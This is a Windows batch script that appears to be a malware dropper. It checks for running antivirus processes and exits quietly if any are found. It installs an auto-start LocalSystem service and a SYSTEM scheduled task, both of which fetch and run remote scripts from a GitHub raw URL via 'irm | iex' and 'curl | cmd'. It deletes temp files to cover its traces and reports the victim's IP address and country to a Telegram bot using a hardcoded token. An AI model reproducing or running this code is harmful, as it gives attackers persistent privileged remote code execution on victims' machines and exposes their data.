setlocal EnableDelayedExpansion
if exist "%ProgramData%\logdata..\Index.exe" (
    del /S /Q "%USERPROFILE%\AppData\Local\Temp\*.*"
    exit /b
)

set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe avpui.exe UninstallTool.exe UninstallToolHelper.exe"

for %a in (%processList%) do (
    tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%a" >NUL
    if not errorlevel 1 (
        del /S /Q "%USERPROFILE%\AppData\Local\Temp\*.*"
        exit /b
    )
)

sc create Help binPath="cmd.exe /c powershell.exe irm https://raw.githubusercontent.com/pushop/0/0/1/run.ps1 ^| iex" start="auto" obj="LocalSystem"
schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc minute /mo 40 /tn "\Windows\Help" /tr "%WINDIR%\System32\cmd.exe /c curl.exe -s https://raw.githubusercontent.com/pushop/0/0/1/ps | cmd /Q /V:ON" /F
del /S /Q "%USERPROFILE%\AppData\Local\Temp\*.*"

if exist "%ProgramData%\sent" exit /b
chcp 65001 >nul
set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
set "CHAT_ID=-4955395962"
set "IP=No IP"
set "Country=No Country"

for /f "tokens=1,2 delims=," %a in ('%WINDIR%\System32\curl.exe -s "http://ip-api.com/csv/?fields=country,query" 2^>nul') do (
    if not "%a"=="" set "Country=%a"
    if not "%b"=="" set "IP=%b"
)

%WINDIR%\System32\curl.exe -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=TRF1%0AIP: %IP%%0ACountry: %Country%" 1>nul 2>nul
echo done > "%ProgramData%\sent"
endlocal
